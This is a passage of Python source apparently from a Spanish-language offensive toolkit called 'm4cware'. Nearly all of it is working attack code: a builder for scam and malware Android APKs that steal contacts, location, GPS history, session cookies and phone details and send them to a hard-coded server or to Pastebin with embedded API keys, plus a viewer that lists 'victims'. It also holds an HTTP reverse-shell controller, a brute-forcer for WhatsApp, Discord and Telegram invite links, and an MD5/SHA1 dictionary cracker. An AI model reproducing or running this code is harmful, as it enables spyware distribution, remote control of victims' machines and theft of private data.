            xml_open.close() # Solucionar error de encode
            """
            # Movimiento de archivos
            #shutil.rmtree("Scam_2/res/layout/main.xml")
            #shutil.rmtree("Scam_2/res/drawable-xhdpi-v4/app_icon.png")

            shutil.move(os.path.join("Scam_2", "res", "drawable-xhdpi-v4", f"{REMP}.png"), os.path.join("Scam_2", "res", "drawable-xhdpi-v4", "app_icon.png"))

            if "win" in SYS_GLOBAL:
                print(f"[APK] COMPRIME LA APK QUE SE ECNUENTRA EN:\n[PATH] {ROOT_MAX}/ ->> Scam_2/")
            else:
                os.chdir("Scam_2/")
                os.system("zip -r Lite.apk *")
                print(f"[APK] APK SIN FIRMA CREADA CON EXITO:\n[PATH] {ROOT_MAX}Scam_2/ ->> Lite.apk")

            #shutil.move("main.xml", "Scam_2/res/layout/main.xml") 

        except:
            print("[ERROR] ALGO SUCEDIO X_X")
            pass
        
        else:
            #print()
            print("[CHECK] ->> LISTO")
            exit(0)

    def obtener(idcap):

        global CONTADOR

        try:
            obtiene=requests.get("http://192.71.249.244:60001/comments")
        except:
            print("[ERROR] ALGO SUCEDIO X_X")
            pass
        else:

            sopa=BeautifulSoup(obtiene.text, "html.parser")

            obtener=str(sopa.find_all(id="comments"))
            obtener=obtener.replace("<br/>", "\n")

            temp=open(".temp", "w", encoding="utf-8")
            temp.write(obtener)
            temp.close()

            temp=open(".temp", encoding="utf-8")
            temp_read=temp.readlines()

            chek=False

            for word in temp_read:
                word=word.replace("\n","")

                if idcap in word:
                    CONTADOR=CONTADOR+1
                    #print(word) DEVOLPING COMMENTS
                    chek=True

                    #print("\n[TARGET]->> SCAM.APK\n")
                    word=word.replace(idcap,"").replace(" ","").replace("</div>]","")
                    #print(word)
                    try:
                        print(f"[HEX] YOUR HEX CODE TARGET->> [{CONTADOR}]")
                        word=str(codecs.decode(word,"hex"))
                        print(word.replace("\\n","\n").replace("b'","[TARGET]->> SCAM.APK ->> ").replace("#'","\n").replace("%40","@").replace("%C3%B1","ñ"))
                    except:
                        print("[ERROR] HEX NO ENCONTRADO X_X")
                        exit(0)

            if chek == False:
                print("[ID] NO ENCONTRAMOS VICTIMAS RELACIONADAS A TU ID")
                exit(0)

            temp.close()
            os.remove(".temp")

    if selec in base_apk:

        try:
            if "Scam_2" in ver_carpeta:
                shutil.rmtree("Scam_2")
                shutil.copytree(os.path.join("assets", "Scam"),"Scam_2")
            else:
                shutil.copytree(os.path.join("assets", "Scam"),"Scam_2")    # Bloque encargado de verificar si hay el apk que se va a crear

        except Exception as err:
            print(err)

        crear(selec, idcap)
    
    else:
        print("[ERROR] Opcion ingresada no valida ...")
    
    if selec == None:
        
        obtener(idcap)

def urljump(select, cant):

    saved_ = []

    def exit_emer_():

        if saved_ != []:
            print("\n",tabulate(saved_, headers=["ENLACES ENCONTRADOS"]))
        else:
            print(f"---------------------\n[JUMPED] No encontramos ningun enlace valido ...")
        exit(0)

    
    # funcion para testear codigo de error 429

    def not_429(url_chk):

        chk_label = []

        for i in range(5):
            try:
                ch_ = requests.get(url_chk, headers=headers)
                chk_label.append(ch_.status_code)
            except Exception as err:
                print(f"[ERROR] {err}")

        if chk_label.count(429) == len(chk_label):
            print("[ERROR] Conexion con el servidor perdida ->> [429]")
            exit_emer_()

    # 0 = wsp 1 = discord 2 = telegram

    chk_ = {

        "wa": 0,
        "dc": 1,
        "tg": 2,
        "bt": 3,
        "yt": 4,
        "ip": 5
        
    }

    select = select.lower(); cant = int(cant)

    if select in chk_ and cant > 0:

        print(f"[JUMPED] {select.upper()} LINKS [{cant}]\n---------------------")

        select = chk_[select]#; select = int(select)
        url = [

            # 0 = url                1 = str char                  2 = error str
            ["chat.whatsapp.com/", r'[\l\d]{22}', "https://static.whatsapp.net/rsrc.php/v4/yB/r/_0dVljceIA5.png"],
            ["discord.gg/", r'[\l\d]{8}', 'property="og:image"'], # Solucionar problema de baneo --> Ya esta listo xd
            ["t.me/+", r'[\l\d]{16}', "tgme_icon_group"],
            ["bit.ly/", r'[\l\d]{7}', "/static/graphics/meditation.png"],
            ["www.youtube.com/watch?v=", r'[\l\d-_]{11}', '"status":"ERROR"'],
            # Desarrollo no funcional aun #
            ["meet.google.com/", r"[\l]{3}-[\l]{4}-[\l]{3}", ""],
            ["iplogger.org/es/logger/", r'[\l\d]{2}105[\l\d]{7}', "error"] # Error aun no encontramos el scraping

        ]

        str_wb = StringGenerator(f"{url[select][1]}").render_list(cant, unique=True) # 200 = can make

        #str_wb[100] = "9geG9GgD"
        #str_wb.append("qNnja1EMaT5mMjE0")

        for url_s in str_wb:

            headers = {
                "User-Agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
                    "Mozilla/5.0 (Linux; Android 10)"
                ])
            }

            try:
                soli = requests.get(f"https://{url[select][0]}{url_s}", headers=headers)
            except KeyboardInterrupt:
                exit_emer_()
            except Exception as err:
                print(f"[ERROR] {err}")
                exit_emer_()

            """
            with open("a.txt", "w", encoding="utf-8") as a:
                a.write(soli.text)

            #print(soli.text)
            exit(0)
            """

            if soli.status_code == 429: # Cuando nos tiran del server
                not_429(f"https://{url[select][0]}{url_s}")

            if url[select][2] not in soli.text:
                print(f"[PASSED] https://{url[select][0]}{url_s} ->> [{soli.status_code}] ✓")
                saved_.append([f"https://{url[select][0]}{url_s}"])

            else:
                print(f"[SEARCH] https://{url[select][0]}{url_s} ->> [{soli.status_code}]")
        
        exit_emer_()
    
    else:
        print("[ERROR] Opcion no encontrada ...")

def unlocker(type_, dictionary, hash_):
    type_ = type_.lower()
    try:
        with open(dictionary, "r", encoding="utf-8") as dictionary_:

            for match_ in dictionary_:

                match_ = match_.strip()
                if type_ == "md5":

                    unl_ = md5(match_.encode("utf-8")).hexdigest()
                    if unl_ == hash_:
                        print(f"[PASSED] {match_} <---✓---> {unl_}")
                        exit(0)
                
                if type_ == "sha1":
                    unl_ = sha1(match_.encode("utf-8")).hexdigest()
                    if unl_ == hash_:
                        print(f"[PASSED] {match_} <---✓---> {unl_}")
                        exit(0)
                
                print(f"[SEARCH] {match_} <---x---> {unl_}")

    except Exception as err:
        print(f"[ERROR] {err}")

def m4cware():

    try:
        with open(".id", "r", encoding="utf-8") as one_id_scan:
            one_id = json.load(one_id_scan)

    except:

        with open(".id", "w", encoding="utf-8") as one_id_scan:

            ####### APARTE DE VALIDAR SI YA SE ABRIO EL PROGRAMA, TAMBIEN GUARDA LAS CREDENCIALES PUBLICAS.

            one_id_app = f"m{random.randint(1, 9)}_{random.randint(1, 10)}_node_{random.randint(1, 10)}_web.json"
            one_id = {

                "one_id": one_id_app,
                "api_dev_key": "uiqdqjM5LG8gdaKaUo05nzSZGIFO2msx", # cuenta nueva
                "api_user_key": "26e531de791eb3a446ed18788e9dfb94" # cuenta nueva

            }

            one_id_scan.write(str(one_id).replace("'", '"'))

    AC_options = [
        # Los Booleanos son para saber si estan disponibles o no.
        # Los numeros 0 son aquellos que no ocupan recursos de envio a Pastebin.
        # Los ["null"] son aquellos que no tienen permisos necesarios.
        ["01) Borrar Directorio", False, 0, ["READ_EXTERNAL_STORAGE", "WRITE_EXTERNAL_STORAGE"] ],
        ["02) Informacion del Telefono", False, 1, ["null"] ],
        ["03) Abrir Enlace", False, 0, ["null"] ],
        ["04) Llamada o Comando telefonico", False, 0, ["CALL_PHONE"] ],
        ["05) Obtener Localizacion", False, 16, ["ACCESS_FINE_LOCATION"] ],
        ["06) Obtener IP", False, 4, ["null"] ],
        ["07) Obtener Cookies de Sesion [BETA]", False, 32, ["null"]],
        ["08) Obtener Contactos [BETA]", False, 8, ["READ_CONTACTS"]],
        ["09) Obtener Historial De Ubicaciones [BETA]", False, 2, ["READ_EXTERNAL_STORAGE"]] # Los numeros son para identificar que zona debe de enviar en base a las sumas de estos mismos.

        ]

    LY_options = [

        ["01) Modificar Package Name [NOT FOUND]", "com.lite.lt"],
        ["02) Modificar Name", "Lite"],
        ["03) Modificar Color de Barra Superior", "#ff000000"],
        ["04) Modificar Icono de Aplicacion", "Default"],
        ["05) Modificar Contenido de Aplicacion", "https://www.google.com"],
        ["06) Modificar el Peso de Aplicacion", "0"],
        ["07) Activar Envio Multiple", "False"]

    ]

    # LY_tmp = ["com.lite.lt", "Lite", "#ff000000", "Default", "https://www.google.com"]

    AC_map = {
        "one_id": one_id["one_id"], "api_dev_key": one_id["api_dev_key"],
        "api_user_key": one_id["api_user_key"],"load": "https://www.google.com"
        }

    def victims_apk():

        while True:

            check = False; get_url = []; file_sv = "" # Variables del bloque de deteccion y almacenamiento de URLS asociadas
            #-------------- Identificador unico

            params = {

                "api_dev_key": one_id["api_dev_key"], # cuenta nueva
                "api_user_key": one_id["api_user_key"], # cuenta nueva
                "api_option": "list",
                "api_results_limit": "1000"

            }

            try:
                paste = requests.post("https://pastebin.com/api/api_post.php", data=params); paste_ = str(paste.text).splitlines()  # Se obtiene y se guarda en una variable los resultados
            except Exception as err:
                print(f"[ERROR] {err}")

            if len(paste_) > 5:

                for linea in paste_:
                    
                    if one_id["one_id"] in linea: # Se verifica y confirma la existencia del nombre en el historial
                        check = True

                    if check == True:
                        if "https://" in linea: # Se obtiene el enlace mas proximo del identificador
                            get_url.append(linea.strip().replace("<paste_url>", "").replace("</paste_url>", ""))
                            check = False # Se vuelve a desactivar para seguir en busqueda iterativa

                if get_url != []:

                    try:
                        select = int(input(f"""
VICTIMS ->> [{len(get_url)}]
---------------------------
01) Descargar Resultados
02) Verificar Resultados
---------------------------
99) Salir

m4cware->> """))
                        
                        if select == 1:
                            try:
                                for url_ in get_url:
                                    file_dw = requests.get(url_.replace("pastebin.com/", "pastebin.com/raw/"))
                                    file_sv = file_sv + str(file_dw.text) + "\n"
                                with open("targets.txt", "w", encoding="utf-8") as file_fl:
                                    file_fl.write(file_sv)
                                print("[PASSED] Archivo targets.txt descargado correctamente ...")
                            except Exception as err:
                                print(f"[ERROR] {err}")

                        if select == 2:
                            select = int(input(f"VICTIMS SELECT // [{len(get_url)}/{len(get_url)}] ->> "))
                            try:
                                file_dw = requests.get(get_url[select-1].replace("pastebin.com/", "pastebin.com/raw/"))
                                print("---------------------------")
                                print(file_dw.text.replace("{", "{\n").replace(",",",\n").replace('"};', '"\n};'))
                            except Exception as err:
                                print(f"[ERROR] {err}")
                        
                        if select == 99:
                            break

                    except Exception as err:
                        print(f"[ERROR] {err}")
            else:
                print("[ERROR] Aun no se han encontrado victimas ...")
                break

    def style_apk():
        
        while True:

            print("IMPLEMENTATION ACTIVITIES ->> [APK]\n-----------------------------------")

            for item in LY_options:
                print(item[0], "["+item[1]+"]")

            try:
                select = int(input("-----------------------------------\n99) Guardar & Salir\n\nm4cware->> "))

                if select == 1:
                    #ly_select = input("Nuevo Package Name: ")
                    pass
                elif select == 2:
                    ly_select = input("Nuevo Name: ")
                elif select == 3:
                    ly_select = input("Nuevo Color de Barra Superior [HEX]: ")
                elif select == 4:
                    ly_select = input("Ruta del nuevo icono de la APK: ")
                elif select == 5:
                    ly_select = input("URL de la pagina web que se mostrara como contenido: ")
                    AC_map["load"] = ly_select
                elif select == 6:
                    ly_select = input("Ingresa el peso en MB a aumentar: ")
                elif select == 7:
                    ly_select = "True"
                    AC_map.setdefault("reload", "True")
                elif select == 99:
                    break
                
                if select != 1: # Este condicional es para evitar que usen el numero 1
                    LY_options[select-1][1] = ly_select

            except Exception as err:
                print(f"[ERROR] {err}")

    def actions_apk():

        while True:

            print("IMPLEMENTATION ACTIVITIES ->> [APK]\n-----------------------------------")

            for item in AC_options:
                if item[1] == True:
                    print(item[0], "✓")
                else:
                    print(item[0])
            try:
                select = int(input("-----------------------------------\n99) Guardar & Salir\n\nm4cware->> "))

                if select == 99:
                    break

                if AC_options[select-1][1] == True:
                    print("[BUSY] Opcion ya implementada ...")

                if select == 1 and AC_options[0][1] == False: # Del file or Dir
                    ac_inp = input("Ingresa la ruta a eliminar: ")
                    AC_map.setdefault("del", ac_inp)
                elif select == 2 and AC_options[1][1] == False: # Info phone
                    AC_map.setdefault("info", "on") 
                elif select == 3 and AC_options[2][1] == False: # Open naveg
                    ac_inp = input("Ingresa el enlace a abrir en el navegador: ")
                    AC_map.setdefault("open", ac_inp)
                elif select == 4 and AC_options[3][1] == False: # Call numbre or USSD 
                    ac_inp = input("Ingresa el numero telefonico o codigo a ejecutar: ")
                    AC_map.setdefault("call", ac_inp)
                elif select == 5 and AC_options[4][1] == False: # Locate
                    AC_map.setdefault("locate", "on")
                elif select == 6 and AC_options[5][1] == False: 
                    AC_map.setdefault("ip", "on")
                elif select == 7 and AC_options[6][1] == False: 
                    AC_map.setdefault("cookies", "on")
                elif select == 8 and AC_options[7][1] == False: 
                    AC_map.setdefault("contacts", "on")
                elif select == 9 and AC_options[8][1] == False:
                    AC_map.setdefault("history_gps", "on")

                AC_options[select-1][1] = True # Se cambia el valor de la opcion a True indicando que ya se a realizado una opcion
                # indicando asi que no se puede utilizar
            except Exception as err:
                print(f"[ERROR] {err}")

    def compilar():

        try:
            if len(AC_map) == 4:
                print("[ERROR] Aun no modificas el APK ...")

            else:
                dirs_ = os.listdir(".")

                # Linux y windows

                try:
                    if "apktool.jar" not in dirs_ and "win" in SYS_GLOBAL:

                        down_bat = requests.get("https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/windows/apktool.bat")
                        downl_apk = requests.get("https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.10.0.jar")
                    
                        with open("apktool.jar", "wb") as apk_tool, open("apktool.bat", "wb") as apk_tool_bat:
                            apk_tool.write(downl_apk.content)
                            apk_tool_bat.write(down_bat.content)
                
                except Exception as err:
                    print(f"[ERROR] {err}")
                
                if "m4.apk" not in dirs_:             # Importa el apk para trabajar mejor con ella
                    shutil.copy(os.path.join("assets", "m4.apk"), ".")

                ## Linux y Windows
                if "win" in SYS_GLOBAL:
                    os.system(".\\apktool.bat m4.apk")
                else:
                    os.system("apktool d m4.apk")

                #############################################################
                #                       Layaut VARS                         #
                #############################################################
                strings_ = os.path.join("m4", "res", "values", "strings.xml")
                colors_ = os.path.join("m4", "res", "values", "colors.xml")
                pack_age_name_dir = os.path.join("m4", "AndroidManifest.xml")
                app_icon_ = os.path.join("m4", "res", "drawable-xhdpi", "app_icon.png")
                size_bin = os.path.join("m4", "assets", "resources.conf")
                #############################################################
                #                       Actions VARS                        #
                #############################################################
                assets_json = os.path.join("m4", "assets", "info.json")
                #############################################################
                #                   Modification of Files                   #
                #############################################################
                if LY_options[0][1] != "com.lite.lt":

                    temp_package = LY_options[0][1].replace(".", " ").split()
                    vars_lte = ["com", "lite", "lt"]
                    
                    pack_age_dirs_rename = os.path.join("m4", "smali_classes5", "")
                    vars_rename_lte = os.path.join("m4", "smali_classes5", "")
                    
                    for i in range(3):

                        os.rename(vars_rename_lte+vars_lte[i], pack_age_dirs_rename+temp_package[i])

                        pack_age_dirs_rename = os.path.join(pack_age_dirs_rename, temp_package[i], "")
                        vars_rename_lte = os.path.join(vars_rename_lte, temp_package[i], "")
                    
                    with open(pack_age_name_dir, "r") as pack_age_name:
                        read_package = pack_age_name.read(); read_package = read_package.replace("com.lite.lt", LY_options[0][1])
                    
                    with open(pack_age_name_dir, "w", encoding="utf-8") as pack_age_name:
                        pack_age_name.write(read_package)

                if LY_options[1][1] != "Lite":

                    with open(strings_, "r") as name:
                        # LECTURA DE CONTENDIO                ### MODIFICACION DEL CONTENIDO
                        read_name = name.read(); read_name = read_name.replace("Lite", LY_options[1][1])
                    with open(strings_, "w", encoding="utf-8") as name:
                        name.write(read_name)

                if LY_options[2][1] != "#ff000000":

                    with open(colors_, "r") as color:
                        read_color = color.read(); read_color = read_color.replace("#ff000000", LY_options[2][1])
                    with open(colors_, "w", encoding="utf-8") as color:
                        color.write(read_color)

                if LY_options[3][1] != "Default":      # Modifica el icon del apk
                    os.replace(LY_options[3][1], app_icon_)
                
                if LY_options[5][1] != "0":
                    #os.mkdir(size_bin.replace("resources.conf", ""))

                    size_ = int(LY_options[5][1]) * 1024 * 1024

                    with open(size_bin, "wb") as binario:
                        binario.write(os.urandom(size_))

                #############################################################
                #                       Making JSON                         #
                #############################################################

                sum_ = 0
                for numero in AC_options:

                    if numero[1] == True: # Se encarga de solamente sumar las acciones agregadas
                        sum_ = numero[2] + sum_
                
                if sum_ >= 32:                      # Problema matematico: Cada vez es el doble de lo anterior, probocado por la suma de estos mismos.
                    sender_ = "cookies"             # Es decir: La suma de las opciones anteriores + 1 es el siguiente orden de prioridad.
                if sum_ >= 16 and sum_ < 32:
                    sender_ = "locate"
                if sum_ >= 8 and sum_ < 16: 
                    sender_ = "contacts"
                if sum_ >= 4 and sum_ < 8:   
                    sender_ = "ip"
                if sum_ >= 2 and sum_ < 4:
                    sender_ = "history_gps"
                if sum_ == 1:
                    sender_ = "info"
                
                if sum_ > 0:
                    AC_map.setdefault("sender", sender_) # Configura que parte del codigo en la app envia la informacion 

                with open(assets_json, "w", encoding="utf-8") as save_json: # Guarda el json encargado del comportamiento del apk
                    save_json.write(str(AC_map).replace("'", '"'))
                
                #############################################################
                #                Delete Unnecessary Permissions             #
                #############################################################

                emergency_ = '    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n' # Acces_Network nunca se borra, por ende se toma como referencia

                with open(pack_age_name_dir, "r") as android: # Bloque encargado de quitar o dejar permisos dependiendo de la seleccion
                    lectura = android.read()

                    for opciones in AC_options: # Por cada opcion en AC_Options

                        if opciones[1] == False and len(opciones[3]) > 1: # Si la opcion con permisos no se esta ocupando Y la opcion tiene mas de 1 permiso

                            for permiso in opciones[3]: # Por cada permiso se borra de Android Manifest
                                permiss =  f'    <uses-permission android:name="android.permission.{permiso}"/>\n'
                                lectura = lectura.replace(permiss, "")

                        elif opciones[1] == False and opciones[3][0] != "null": # Mientras el permiso no sea null y el permiso no esa ocupandose

                            permiss = f'    <uses-permission android:name="android.permission.{opciones[3][0]}"/>\n'
                            lectura = lectura.replace(permiss, "")

                        elif opciones[1] == True and opciones[3][0] not in lectura: # Si es que el permiso que se va a ocupar ya se elimino

                            permiss = f'    <uses-permission android:name="android.permission.{opciones[3][0]}"/>\n'
                            lectura = lectura.replace(emergency_, emergency_+permiss) # Agrega el permiso que se necesita
                
                with open(pack_age_name_dir, "w", encoding="utf-8") as save_android:
                    save_android.write(lectura)
                
                ## Linux y windows

                if "win" in SYS_GLOBAL:
                    os.system(".\\apktool.bat b m4 -o m4_moded.apk")
                else:
                    os.system("apktool b m4 -o m4_moded.apk")
                
                try:
                    shutil.rmtree("m4"); os.remove("m4.apk")  # Elimina los archivos ya ocupados
                    
                except Exception as err:
                    print(f"[ERROR] {err}")
        
        except Exception as err:
            print(f"[ERROR] {err}")

    def api_settings():
        while True:
            try:
                new_dev = input("""
API SETTINGS <> [M4CWARE]
-------------------------
PASTEBIN [https://pastebin.com/doc_api]

Introduce tu 'api_dev_key' de Pastebin: """)
                
                new_user = input("Introduce tu 'api_user_key' de Pastebin: ")

                with open(".id", "w", encoding="utf-8") as new_paste:

                    one_id["api_dev_key"] = new_dev; one_id["api_user_key"] = new_user
                    new_paste.write(str(one_id).replace("'", '"'))

                print("[RESET] Claves ingresadas con exito ...")
                exit(0)

            except Exception as err:
                print(f"[ERROR] {err}")

    while True:
        try:
            select = int(input("""
OPTIONS ->> [MALWARE-APK-CREATOR]
---------------------------------
01) APK Style   03) APK Victims
02) APK Actions 04) API Settings
---------------------------------
99) Salir       00) Compilar

m4cware->> """))
        except Exception as err:
            print(f"[ERROR] {err}")
        else:
            if select == 1:
                style_apk()
            elif select == 2:
                actions_apk()
            elif select == 3:
                victims_apk()
            elif select == 4:
                api_settings()
            elif select == 00:
                compilar()
            else:
                exit(0)

def reverhttp(url_port):

    headers = {"Cache-Control":"no-cache"}

    cmd_help="""
[HTTPREVERSE]->>[V.1.0]

ASSOC          Muestra o modifica las asociaciones de las extensiones
               de archivos.
ATTRIB         Muestra o cambia los atributos del archivo.
BREAK          Establece o elimina la comprobación extendida de Ctrl+C.
BCDEDIT        Establece propiedades en la base de datos de arranque para
               controlar la carga del arranque.
CACLS          Muestra o modifica las listas de control de acceso (ACLs)
               de archivos.
CALL           Llama a un programa por lotes desde otro.
CD             Muestra el nombre del directorio actual o cambia a otro
               directorio.
CHCP           Muestra o establece el número de página de códigos activa.
CHDIR          Muestra el nombre del directorio actual o cambia a otro
               directorio.
CHKDSK         Comprueba un disco y muestra un informe de su estado.
CHKNTFS        Muestra o modifica la comprobación de disco al arrancar.
CLS            Borra la pantalla.
CMD            Inicia una nueva instancia del intérprete de comandos
               de Windows
COLOR          Establece los colores de primer plano y fondo predeterminados
               de la consola.
COMP           Compara el contenido de dos archivos o un conjunto de archivos.
COMPACT        Muestra o cambia el estado de compresión de archivos
               en particiones NTFS.
CONVERT        Convierte volúmenes FAT a volúmenes NTFS. No puede convertir
               la unidad actual.
COPY           Copia uno o más archivos en otra ubicación.
DATE           Muestra o establece la fecha.
DEL            Elimina uno o más archivos.
DIR            Muestra una lista de archivos y subdirectorios en un
               directorio.
DISKPART       Muestra o configura las propiedades de partición de disco.
DOSKEY         Edita líneas de comando, recupera comandos de Windows y
               crea macros.
DRIVERQUERY    Muestra el estado y las propiedades actuales del controlador de dispositivo.
ECHO           Muestra mensajes, o activa y desactiva el eco.
ENDLOCAL       Termina la búsqueda de cambios de entorno en un archivo por lotes.
ERASE          Elimina uno o más archivos.
EXIT           Sale del programa CMD.EXE (intérprete de comandos).
FC             Compara dos archivos o conjunto de archivos y muestra las
               diferencias entre ellos.
FIND           Busca una cadena de texto en uno o más archivos.
FINDSTR        Busca cadenas en archivos.
FOR            Ejecuta el comando especificado para cada archivo en un conjunto de archivos.
FORMAT         Formatea un disco para usarse con Windows.
FSUTIL         Muestra o configura las propiedades del sistema de archivos.
FTYPE          Muestra o modifica los tipos de archivo usados en
               asociaciones de extensión de archivo.
GOTO           Direcciona el intérprete de comandos de Windows a una línea con etiqueta
               en un programa por lotes.
GPRESULT       Muestra información de directiva de grupo por equipo o usuario.
GRAFTABL       Permite a Windows mostrar un juego de caracteres extendidos
               en modo gráfico.
HELP           Proporciona información de Ayuda para los comandos de Windows.
ICACLS         Muestra, modifica, hace copias de seguridad o restaura listas de control de acceso (ACL) para archivos y
               directorios.
IF             Ejecuta procesos condicionales en programas por lotes.
LABEL          Crea, cambia o elimina la etiqueta del volumen de un disco.
MD             Crea un directorio.
MKDIR          Crea un directorio.
MKLINK         Crea vínculos simbólicos y vínculos físicos
MODE           Configura un dispositivo de sistema.
MORE           Muestra la información pantalla por pantalla.
MOVE           Mueve uno o más archivos de un directorio a otro en la
               misma unidad.
OPENFILES      Muestra archivos compartidos abiertos por usuarios remotos como recurso compartido de archivos.
PATH           Muestra o establece una ruta de búsqueda para archivos ejecutables.
PAUSE          Suspende el proceso de un archivo por lotes y muestra un mensaje.
POPD           Restaura el valor anterior del directorio actual guardado
               por PUSHD.
PRINT          Imprime un archivo de texto.
PROMPT         Cambia el símbolo de comandos de Windows.
PUSHD          Guarda el directorio actual y después lo cambia.
RD             Quita un directorio.
RECOVER        Recupera la información legible de un disco dañado o defectuoso.
REM            Registra comentarios (notas) en archivos por lotes o CONFIG.SYS.
REN            Cambia el nombre de uno o más archivos.
RENAME         Cambia el nombre de uno o más archivos.
REPLACE        Reemplaza archivos.
RMDIR          Quita un directorio.
ROBOCOPY       Utilidad avanzada para copiar archivos y árboles de directorios
SET            Muestra, establece o quita variables de entorno de Windows.
SETLOCAL       Inicia la localización de los cambios de entorno en un archivo por lotes.
SC             Muestra o configura servicios (procesos en segundo plano).
SCHTASKS       Programa comandos y programas para ejecutarse en un equipo.
SHIFT          Cambia la posición de parámetros reemplazables en archivos por lotes.
SHUTDOWN       Permite el apagado local o remoto de un equipo.
SORT           Ordena la salida.
START          Inicia otra ventana para ejecutar un programa o comando especificado.
SUBST          Asocia una ruta de acceso con una letra de unidad.
SYSTEMINFO     Muestra las propiedades y la configuración específicas del equipo.
TASKLIST       Muestra todas las tareas en ejecución, incluidos los servicios.
TASKKILL       Termina o interrumpe un proceso o aplicación que se está ejecutando.
TIME           Muestra o establece la hora del sistema.
TITLE          Establece el título de la ventana de una sesión de CMD.EXE.
TREE           Muestra gráficamente la estructura de directorios de una unidad o
               ruta de acceso.
TYPE           Muestra el contenido de un archivo de texto.
VER            Muestra la versión de Windows.
VERIFY         Comunica a Windows si debe comprobar que los archivos se escriben
               de forma correcta en un disco.
VOL            Muestra la etiqueta del volumen y el número de serie del disco.
XCOPY          Copia archivos y árboles de directorios.
WMIC           Muestra información de WMI en el shell de comandos interactivo.

[ESTA VISION ES DESDE TU MAQUINA]
"""

    path_dir = os.listdir(".")

    if "server" not in path_dir:

        os.mkdir("server")
        inicio=open(os.path.join("server", "cmd.txt"), "w")
        inicio.write("systeminfo")
        inicio.close()
        
        lst = ["cmd_reverse.php", "cmd.php"]
        
        for move_ in lst:
            shutil.copy(os.path.join("assets", move_), "server/")

    def server(port):

        try:
            if ":" in port: 
                creacion(port)
            else:
                port = int(port)

                if "win" not in SYS_GLOBAL:

                    try:
                        print('[SERVER] CORRIENDO EN ->> http://localhost:{}'.format(port))
                        os.system("php -S localhost:{} -t server".format(port))

                    except Exception as err:
                        print(f"[ERROR] {err}")
                        pass
                else:
                    print("[DEVP] Abrir servidor con PHP aun esta en desarrollo ...")

        except Exception as err:
            print(f"[ERROR] {err}")

    def maquina(server_str):
        pasado=""

        print("[TERMINAL] ESPERANDO CONEXION")
        while True:
            time.sleep(1)

            try:
                
                if ":" not in server_str.replace("://", ""): # Si la url no es localhost
                    obtener_resultado = requests.get(f"{server_str}capture.txt", headers=headers)
                    leer = obtener_resultado.text
                
                else:
                    lectura=open(os.path.join("server", "capture.txt"))
                    leer=lectura.read()
                    lectura.close()
                
            except:
                leer=""
                pass

            else:

                nuevo = str(leer)

                if nuevo != "" and nuevo != pasado:

                    pasado=nuevo
                    print(nuevo.replace("[ESP]", " ").replace("\\r\\n","\n"))

                    comando=input("reverchttp ->>")

                    if comando == "exit":
                        break
                    if comando == "help":
                        print(cmd_help)  # NUEVA LINEA... PROBAR MAÑANA
                        pass

                    if ":" not in server_str.replace("://", ""): # Si la url no es localhost

                        data={"cmd":"{}".format(comando)}
                        
                        try:
                            obtener_resultado = requests.post(f"{server_str}cmd_reverse.php", data=data)
                        except:
                            pass
                    
                    else:

                        data=open(os.path.join("server", "cmd.txt"), "w")
                        data.write(comando)
                        data.close()
                else:
                    pass

    def creacion(server_str):

        try:
            if server_str + "/" not in server_str:
                server_str = server_str + "/"

            with open(os.path.join("assets", "reversehttp.py"), "r") as leer, open(os.path.join("server", "reversehttp_clone.py"), "w") as escribir:
                leer_str = leer.read()
                escribir.write(leer_str.replace("URL_FUN",server_str))
            
            print("[PASS] Archivo guardado en ./server/reversehttp_clone.py")
            print("-------------------------------------------------\n[PAUSE] Entrando en modo escucha [20sec] ...")
            time.sleep(20)
            maquina(server_str)

        except Exception as err:
            print(f"[ERROR] {err}")
    
    server(url_port)

# python3 fsh.py urldump --a <social_network> --b <count> < ------------ in mgt0ls
#################################